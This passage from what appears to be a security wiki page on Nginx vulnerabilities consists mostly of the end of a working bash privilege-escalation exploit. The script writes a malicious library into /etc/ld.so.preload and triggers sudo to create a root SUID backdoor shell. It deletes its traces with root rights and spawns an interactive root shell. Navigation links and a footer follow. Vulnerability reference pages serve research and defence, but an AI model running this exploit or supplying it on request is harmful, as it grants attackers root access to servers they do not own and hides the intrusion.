<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Adding </span><span class="nv">$PRIVESCLIB</span><span class="s2"> shared lib to /etc/ld.so.preload&quot;</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&quot;</span>
chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/etc/ld.so.preload

<span class="c1"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Escalating privileges via the </span><span class="nv">$SUIDBIN</span><span class="s2"> SUID binary to get root!&quot;</span>
sudo<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span>&gt;/dev/null

<span class="c1"># Check for the rootshell</span>
ls<span class="w"> </span>-l<span class="w"> </span><span class="nv">$BACKDOORPATH</span>
ls<span class="w"> </span>-l<span class="w"> </span><span class="nv">$BACKDOORPATH</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>rws<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span>root
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l </span><span class="nv">$BACKDOORPATH</span><span class="s2">`&quot;</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m&quot;</span>
<span class="k">else</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] Failed to get root&quot;</span>
<span class="w">    </span>cleanexit<span class="w"> </span><span class="m">2</span>
<span class="k">fi</span>

rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$ERRORLOG</span>
<span class="nb">echo</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$ERRORLOG</span>

<span class="c1"># Use the rootshell to perform cleanup that requires root privilges</span>
<span class="nv">$BACKDOORPATH</span><span class="w"> </span>-p<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;rm -f /etc/ld.so.preload; rm -f </span><span class="nv">$PRIVESCLIB</span><span class="s2">&quot;</span>
<span class="c1"># Reset the logging to error.log</span>
<span class="nv">$BACKDOORPATH</span><span class="w"> </span>-p<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;kill -USR1 `pidof -s nginx`&quot;</span>

<span class="c1"># Execute the rootshell</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Spawning the rootshell </span><span class="nv">$BACKDOORPATH</span><span class="s2"> now! \n&quot;</span>
<span class="nv">$BACKDOORPATH</span><span class="w"> </span>-p<span class="w"> </span>-i

<span class="c1"># Job done.</span>
cleanexit<span class="w"> </span><span class="m">0</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2017-7529%EF%BC%89Nginx%20%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2017-7529%EF%BC%89Nginx%20%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2017-7529）Nginx 越界读取缓存漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2013-4547%EF%BC%89Nginx%20URI%20Processing%20%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2013-4547%EF%BC%89Nginx%20URI%20Processing%20%E5%AE%89%E5%85%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2013-4547）Nginx URI Processing 安全绕过漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>